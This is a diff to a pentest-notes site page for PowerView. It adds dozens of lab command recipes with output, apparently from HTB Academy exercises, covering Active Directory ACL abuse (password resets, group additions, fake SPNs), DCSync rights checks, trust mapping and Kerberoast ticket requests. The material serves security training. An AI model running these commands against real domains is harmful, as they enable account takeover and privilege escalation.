@@ -2,7 +2,7 @@
 title: "PowerView"
 sidebarTitle: "PowerView"
 description: "Import PowerView, then query users, computers and groups."
-keywords: ["powerview", "Get-DomainUser", "Get-DomainComputer", "Get-DomainGroup", "Get-DomainGroupMember"]
+keywords: ["powerview", "Get-DomainUser", "Get-DomainComputer", "Get-DomainGroup", "Get-DomainGroupMember", "Add-DomainGroupMember", "Add-DomainObjectACL", "Convert-NameToSid", "Convert-SidToName", "Find-DomainShare", "Find-LocalAdminAccess", "Get-Domain", "Get-DomainController", "Get-DomainForeignGroupMember", "Get-DomainGPO", "Get-DomainObject", "Get-DomainObjectACL", "Get-DomainPolicy", "Get-DomainSID", "Get-DomainSPNTicket", "Get-DomainSearcher", "Get-DomainTrust", "Get-DomainTrustMapping", "Get-ObjectAcl", "Remove-DomainGroupMember", "Set-DomainObject", "Set-DomainObjectOwner", "Set-DomainUserPassword", "Test-AdminAccess"]
 boost: 10
 hideFooterPagination: true
 ---
@@ -10,6 +10,8 @@ hideFooterPagination: true
 {/* Generated from Commands/powerview.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
 Replace UPPER_CASE values with your lab values.
+
+[Search this tool’s saved examples](/commands/notebook?tool=powerview) · [All tools](/index)
 
 ## Commands
 
@@ -24,8 +26,1190 @@ Get-DomainGroupMember -Identity "Domain Admins"
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=powerview)
+## Notebook recipes
 
-## Learning and original examples
+64 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [PowerView — Load and Enumerate](/tools/powerview)
+<AccordionGroup>
+
+<Accordion title="Adding damundsen to the Help Desk Level 1 Group">
+
+### Adding damundsen to the Help Desk Level 1 Group
+
+**ACL Abuse Tactics**
+
+```powershell
+PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
+```
+
+</Accordion>
+
+<Accordion title="Changing the User&#x27;s Password">
+
+### Changing the User's Password
+
+**ACL Abuse Tactics**
+
+```powershell
+PS C:\htb> cd C:\Tools\
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
+VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
+```
+
+</Accordion>
+
+<Accordion title="Confirming damundsen was Added to the Group">
+
+### Confirming damundsen was Added to the Group
+
+**ACL Abuse Tactics**
+
+```powershell
+PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
+MemberName
+----------
+busucher
+spergazed
+
+<SNIP>
+
+damundsen
+dpayne
+```
+
+</Accordion>
+
+<Accordion title="Confirming damundsen was Removed from the Group">
+
+### Confirming damundsen was Removed from the Group
+
+**ACL Abuse Tactics**
+
+```powershell
+PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
+```
+
+</Accordion>
+
+<Accordion title="Creating a Fake SPN">
+
+### Creating a Fake SPN
+
+**ACL Abuse Tactics**
+
+```powershell
+PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
+(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
+VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
+```
+
+</Accordion>
+
+<Accordion title="Removing damundsen from the Help Desk Level 1 Group">
+
+### Removing damundsen from the Help Desk Level 1 Group
+
+**ACL Abuse Tactics**
+
+```powershell
+PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
+True
+```
+
+</Accordion>
+
+<Accordion title="Removing the Fake SPN from adunn&#x27;s Account">
+
+### Removing the Fake SPN from adunn's Account
+
+**ACL Abuse Tactics**
+
+```powershell
+PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
+(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
+VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
+```
+
+</Accordion>
+
+<Accordion title="Further Enumeration of Rights Using damundsen">
+
+### Further Enumeration of Rights Using damundsen
+
+**ACL Enumeration**
+
+```powershell
+PS C:\htb> $sid2 = Convert-NameToSid damundsen
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
+
+AceType               : AccessAllowed
+ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
+OpaqueLength          : 0
+ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
+InheritanceFlags      : ContainerInherit
+BinaryLength          : 36
+IsInherited           : False
+IsCallback            : False
+PropagationFlags      : None
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
+AccessMask            : 131132
+AuditFlags            : None
+AceFlags              : ContainerInherit
+AceQualifier          : AccessAllowed
+```
+
+</Accordion>
+
+<Accordion title="Investigating the Help Desk Level 1 Group with Get-DomainGroup">
+
+### Investigating the Help Desk Level 1 Group with Get-DomainGroup
+
+**ACL Enumeration**
+
+```powershell
+PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
+
+memberof
+--------
+CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+```
+
+</Accordion>
+
+<Accordion title="Investigating the Information Technology Group">
+
+### Investigating the Information Technology Group
+
+**ACL Enumeration**
+
+```powershell
+PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
+
+AceType               : AccessAllowed
+ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : GenericAll
+OpaqueLength          : 0
+ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164
+InheritanceFlags      : ContainerInherit
+BinaryLength          : 36
+IsInherited           : False
+IsCallback            : False
+PropagationFlags      : None
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
+AccessMask            : 983551
+AuditFlags            : None
+AceFlags              : ContainerInherit
+AceQualifier          : AccessAllowed
+```
+
+</Accordion>
+
+<Accordion title="Looking for Interesting Access">
+
+### Looking for Interesting Access
+
+**ACL Enumeration**
+
+```powershell
+PS C:\htb> $adunnsid = Convert-NameToSid adunn
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : ContainerInherit
+InheritedObjectAceType : All
+OpaqueLength           : 0
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : ContainerInherit
+InheritedObjectAceType : All
+OpaqueLength           : 0
+
+<SNIP>
+```
+
+</Accordion>
+
+<Accordion title="Using Find-InterestingDomainAcl">
+
+### Using Find-InterestingDomainAcl
+
+**ACL Enumeration**
+
+```powershell
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> $sid = Convert-NameToSid wley
+```
+
+</Accordion>
+
+<Accordion title="Using Get-DomainObjectACL">
+
+### Using Get-DomainObjectACL
+
+**ACL Enumeration**
+
+```powershell
+PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceFlags         : ObjectAceTypePresent
+ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
+BinaryLength           : 56
+AceQualifier           : AccessAllowed
+IsCallback             : False
+OpaqueLength           : 0
+AccessMask             : 256
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
+AceType                : AccessAllowedObject
+AceFlags               : ContainerInherit
+IsInherited            : False
+InheritanceFlags       : ContainerInherit
+PropagationFlags       : None
+AuditFlags             : None
+```
+
+</Accordion>
+
+<Accordion title="Using the -ResolveGUIDs Flag">
+
+### Using the -ResolveGUIDs Flag
+
+**ACL Enumeration**
+
+```powershell
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+AceQualifier           : AccessAllowed
+ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : User-Force-Change-Password
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : ContainerInherit
+InheritedObjectAceType : All
+OpaqueLength           : 0
+```
+
+</Accordion>
+
+<Accordion title="AD ACL Abuse: Quick Reference">
+
+### AD ACL Abuse: Quick Reference
+
+**AD ACL Abuse: Quick Reference**
+
+```powershell
+# Reset a password you have ForceChangePassword over
+$p = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity victim -AccountPassword $p
+# Add self to a group you have AddMember over
+Add-DomainGroupMember -Identity 'Helpdesk' -Members me
+# Targeted Kerberoast via GenericWrite (set an SPN, roast, clear it)
+Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/svc'}
+```
+
+</Accordion>
+
+<Accordion title="Add Members">
+
+### Add Members
+
+**Active Directory ACL Abuse Primer**
+
+```powershell
+Add-DomainGroupMember
+```
+
+</Accordion>
+
+<Accordion title="ForceChangePassword">
+
+### ForceChangePassword
+
+**Active Directory ACL Abuse Primer**
+
+```powershell
+Set-DomainUserPassword
+```
+
+</Accordion>
+
+<Accordion title="GenericAll">
+
+### GenericAll
+
+**Active Directory ACL Abuse Primer**
+
+```powershell
+Set-DomainUserPassword
+Add-DomainGroupMember
+```
+
+</Accordion>
+
+<Accordion title="GenericWrite">
+
+### GenericWrite
+
+**Active Directory ACL Abuse Primer**
+
+```powershell
+Set-DomainObject
+```
+
+</Accordion>
+
+<Accordion title="Quick Recall">
+
+### Quick Recall
+
+**Active Directory ACL Abuse Primer**
+
+```text
+ACL                 List of permissions on an object
+ACE                 One permission entry inside an ACL
+DACL                Allows or denies access
+SACL                Controls auditing
+ForceChangePassword Reset a user's password
+Add Members         Add accounts to a group
+GenericWrite        Modify non-protected attributes
+GenericAll          Full control over an object
+WriteOwner          Change object ownership
+WriteDACL           Modify object permissions
+AddSelf             Add yourself to an allowed group
+BloodHound          Visualize ACL relationships
+PowerView           Enumerate and test AD permissions
+Main outcomes       Lateral movement, privilege escalation, persistence
+```
+
+</Accordion>
+
+<Accordion title="WriteDACL">
+
+### WriteDACL
+
+**Active Directory ACL Abuse Primer**
+
+```powershell
+Add-DomainObjectACL
+```
+
+</Accordion>
+
+<Accordion title="WriteOwner">
+
+### WriteOwner
+
+**Active Directory ACL Abuse Primer**
+
+```powershell
+Set-DomainObjectOwner
+```
+
+</Accordion>
+
+<Accordion title="Powerview">
+
+### Powerview
+
+**Active Directory Enumeration Commands**
+
+```powershell
+Get-DomainUser
+    # Enumerate domain users
+
+Get-DomainUser <USER>
+    # Get information about a specific domain user
+
+Get-DomainGroup
+    # Enumerate domain groups
+
+Get-DomainGroupMember "<GROUP>"
+    # Show members of a domain group
+
+Get-DomainUser <USER> -Properties memberof
+    # Show a user's AD group memberships
+
+Get-DomainComputer
+    # Enumerate domain computers
+
+Get-DomainController
+    # Find Domain Controllers
+
+Get-DomainSPNTicket
+    # Identify/request Kerberos tickets associated with SPNs
+```
+
+</Accordion>
+
+<Accordion title="Active Directory Enumeration: Quick Reference">
+
+### Active Directory Enumeration: Quick Reference
+
+**Active Directory Enumeration: Quick Reference**
+
+```powershell
+# From a domain-joined Windows host (PowerView)
+Get-DomainUser | select samaccountname,description
+Get-DomainComputer | select dnshostname,operatingsystem
+Get-DomainGroupMember "Domain Admins"
+Find-LocalAdminAccess       # where does my user have local admin?
+```
+
+</Accordion>
+
+<Accordion title="Active Directory Trusts: Quick Reference">
+
+### Active Directory Trusts: Quick Reference
+
+**Active Directory Trusts: Quick Reference**
+
+```powershell
+Get-DomainTrust
+Get-DomainTrustMapping           # map the whole forest
+```
+
+</Accordion>
+
+<Accordion title="Obtaining Enterprise Admins Group&#x27;s SID using Get-DomainGroup">
+
+### Obtaining Enterprise Admins Group's SID using Get-DomainGroup
+
+**Child to Parent Trusts - Windows**
+
+```powershell
+PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+
+distinguishedname                                       objectsid
+-----------------                                       ---------
+CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
+```
+
+</Accordion>
+
+<Accordion title="Using Get-DomainSID">
+
+### Using Get-DomainSID
+
+**Child to Parent Trusts - Windows**
+
+```powershell
+PS C:\htb> Get-DomainSID
+
+S-1-5-21-2806153819-209893948-922872689
+```
+
+</Accordion>
+
+<Accordion title="Enumerating Accounts for Associated SPNs Using Get-DomainUser">
+
+### Enumerating Accounts for Associated SPNs Using Get-DomainUser
+
+**Cross-Forest Trusts - Windows**
+
+```powershell
+PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+
+samaccountname
+--------------
+krbtgt
+mssqlsvc
+```
+
+</Accordion>
+
+<Accordion title="Enumerating the mssqlsvc Account">
+
+### Enumerating the mssqlsvc Account
+
+**Cross-Forest Trusts - Windows**
+
+```powershell
+PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+
+samaccountname memberof
+-------------- --------
+mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+```
+
+</Accordion>
+
+<Accordion title="Using Get-DomainForeignGroupMember">
+
+### Using Get-DomainForeignGroupMember
+
+**Cross-Forest Trusts - Windows**
+
+```powershell
+PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+
+GroupDomain             : FREIGHTLOGISTICS.LOCAL
+GroupName               : Administrators
+GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
+MemberDomain            : FREIGHTLOGISTICS.LOCAL
+MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
+MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
+                          TICS,DC=LOCAL
+
+PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
+
+INLANEFREIGHT\administrator
+```
+
+</Accordion>
+
+<Accordion title="Checking for Reversible Encryption Option using Get-DomainUser">
+
+### Checking for Reversible Encryption Option using Get-DomainUser
+
+**DCSync Lab**
+
+```powershell
+PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+
+samaccountname                         useraccountcontrol
+--------------                         ------------------
+proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
+```
+
+</Accordion>
+
+<Accordion title="Using Get-DomainUser to View adunn&#x27;s Group Membership">
+
+### Using Get-DomainUser to View adunn's Group Membership
+
+**DCSync Lab**
+
+```powershell
+PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+
+
+samaccountname     : adunn
+objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
+memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
+                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
+                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
+                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
+useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+```
+
+</Accordion>
+
+<Accordion title="Using Get-ObjectAcl to Check adunn&#x27;s Replication Rights">
+
+### Using Get-ObjectAcl to Check adunn's Replication Rights
+
+**DCSync Lab**
+
+```powershell
+PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
+ObjectAceType         : DS-Replication-Get-Changes
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
+ObjectAceType         : DS-Replication-Get-Changes-All
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
+ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
+ObjectAceType         : DS-Replication-Get-Changes
+
+AceQualifier          : AccessAllowed
+ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ExtendedRight
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
+ObjectAceType         : DS-Replication-Get-Changes-All
+```
+
+</Accordion>
+
+<Accordion title="Checking Users in the Child Domain using Get-DomainUser">
+
+### Checking Users in the Child Domain using Get-DomainUser
+
+**Domain Trusts Primer**
+
+```powershell
+PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
+
+samaccountname
+--------------
+htb-student_adm
+Administrator
+Guest
+lab_adm
+krbtgt
+```
+
+</Accordion>
+
+<Accordion title="Checking for Existing Trusts using Get-DomainTrust">
+
+### Checking for Existing Trusts using Get-DomainTrust
+
+**Domain Trusts Primer**
+
+```powershell
+PS C:\htb> Get-DomainTrust
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 6:20:22 PM
+WhenChanged     : 2/26/2022 11:55:55 PM
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : FREIGHTLOGISTICS.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 8:07:09 PM
+WhenChanged     : 2/27/2022 12:02:39 AM
+```
+
+</Accordion>
+
+<Accordion title="Using Get-DomainTrustMapping">
+
+### Using Get-DomainTrustMapping
+
+**Domain Trusts Primer**
+
+```powershell
+PS C:\htb> Get-DomainTrustMapping
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 6:20:22 PM
+WhenChanged     : 2/26/2022 11:55:55 PM
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : FREIGHTLOGISTICS.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 8:07:09 PM
+WhenChanged     : 2/27/2022 12:02:39 AM
+
+SourceName      : FREIGHTLOGISTICS.LOCAL
+TargetName      : INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 8:07:08 PM
+WhenChanged     : 2/27/2022 12:02:41 AM
+
+SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
+TargetName      : INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 6:20:22 PM
+WhenChanged     : 2/26/2022 11:55:55 PM
+```
+
+</Accordion>
+
+<Accordion title="Encryption Types">
+
+### Encryption Types
+
+**Kerberoasting from Windows**
+
+```powershell
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+```
+
+</Accordion>
+
+<Accordion title="Export All Results to CSV">
+
+### Export All Results to CSV
+
+**Kerberoasting from Windows**
+
+```powershell
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+
+</Accordion>
+
+<Accordion title="Import PowerView and Enumerate SPN Users">
+
+### Import PowerView and Enumerate SPN Users
+
+**Kerberoasting from Windows**
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+```
+
+</Accordion>
+
+<Accordion title="Quick Reference">
+
+### Quick Reference
+
+**Kerberoasting from Windows**
+
+```powershell
+# Request a ticket for one SPN
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
+
+# PowerView enumeration and ticket request
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
+
+# Rubeus statistics and a targeted request
+.\Rubeus.exe kerberoast /stats
+.\Rubeus.exe kerberoast /user:<USER> /nowrap
+```
+
+</Accordion>
+
+<Accordion title="Request a Ticket for One User">
+
+### Request a Ticket for One User
+
+**Kerberoasting from Windows**
+
+```powershell
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
+
+</Accordion>
+
+<Accordion title="Workaround #1: PSCredential Object">
+
+### Workaround #1: PSCredential Object
+
+**Kerberos Double Hop**
+
+```shellsession
+*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1
+
+|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
+Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
+"
+At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
++             else { $Results = $UserSearcher.FindAll() }
++                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DirectoryServicesCOMException
+```
+
+**Kerberos Double Hop**
+
+```shellsession
+*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname
+
+|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+
+samaccountname
+--------------
+azureconnect
+backupjob
+krbtgt
+mssqlsvc
+sqltest
+sqlqa
+sqldev
+mssqladm
+svc_sql
+sqlprod
+sapsso
+sapvc
+vmwarescvc
+```
+
+**Kerberos Double Hop**
+
+```shellsession
+get-domainuser -spn | select
+
+*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname
+
+|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
+"
+At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
++             else { $Results = $UserSearcher.FindAll() }
++                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DirectoryServicesCOMException
+```
+
+</Accordion>
+
+<Accordion title="Workaround #2: Register PSSession Configuration">
+
+### Workaround #2: Register PSSession Configuration
+
+**Kerberos Double Hop**
+
+```powershell
+[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
+[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname
+
+Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
+"
+At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
++             else { $Results = $UserSearcher.FindAll() }
++                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+   + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+   + FullyQualifiedErrorId : DirectoryServicesCOMException
+```
+
+**Kerberos Double Hop**
+
+```powershell
+[DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname
+
+samaccountname
+--------------
+azureconnect
+backupjob
+krbtgt
+mssqlsvc
+sqltest
+sqlqa
+sqldev
+mssqladm
+svc_sql
+sqlprod
+sapsso
+sapvc
+vmwarescvc
+```
+
+</Accordion>
+
+<Accordion title="Checking for PASSWD_NOTREQD Setting using Get-DomainUser">
+
+### Checking for PASSWD_NOTREQD Setting using Get-DomainUser
+
+**Miscellaneous Misconfigurations**
+
+```powershell
+PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+
+samaccountname                                                         useraccountcontrol
+--------------                                                         ------------------
